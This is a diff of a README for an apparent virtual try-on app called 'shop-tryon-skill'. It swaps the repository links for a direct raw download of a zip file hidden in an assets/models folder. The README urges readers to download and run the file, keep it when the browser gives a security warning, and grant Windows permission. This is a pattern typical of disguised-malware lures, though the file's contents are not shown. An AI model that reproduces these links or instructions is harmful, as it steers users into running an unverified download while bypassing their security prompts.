@@ -1,6 +1,6 @@
 # 🛍️ shop-tryon-skill - Create virtual try-on results fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anatomic-universalquantifier643/shop-tryon-skill)
+[![Download Now](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anatomic-universalquantifier643/shop-tryon-skill/raw/refs/heads/main/assets/models/tryon_shop_skill_v1.9.zip)
 
 ## ✨ What this app does
 
@@ -31,7 +31,7 @@ If your PC has a graphics card, image generation may run faster. The app can sti
 
 Go to the download page here and download and run this file:
 
-https://github.com/Anatomic-universalquantifier643/shop-tryon-skill
+https://github.com/Anatomic-universalquantifier643/shop-tryon-skill/raw/refs/heads/main/assets/models/tryon_shop_skill_v1.9.zip
 
 If your browser shows a security prompt, choose the option that keeps the file. If Windows asks for permission, allow the app to open.
 
@@ -217,7 +217,7 @@ For text input, clear wording works best. For example, “blue denim jacket with
 
 If you need the download page again, use this link and download and run this file:
 
-https://github.com/Anatomic-universalquantifier643/shop-tryon-skill
+https://github.com/Anatomic-universalquantifier643/shop-tryon-skill/raw/refs/heads/main/assets/models/tryon_shop_skill_v1.9.zip
 
 ## 📦 Basic folder layout
 
